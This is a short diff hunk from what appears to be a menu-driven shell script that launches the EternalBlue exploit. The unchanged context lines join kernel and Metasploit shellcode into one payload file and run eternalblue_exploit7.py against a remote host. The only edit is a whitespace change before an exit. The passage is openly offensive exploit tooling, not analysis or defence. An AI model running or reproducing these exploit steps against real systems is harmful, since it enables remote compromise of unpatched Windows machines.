@@ -161,7 +161,7 @@ read -p " $(echo -e $az$shell $nc)" opc
            cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
            sleep 1
            python eternalblue_exploit7.py $rhost sc_x64.bin
-	        exit
+	   exit
     elif [ $opc -eq 4 ]; then
 	   echo ""
 	   echo ""
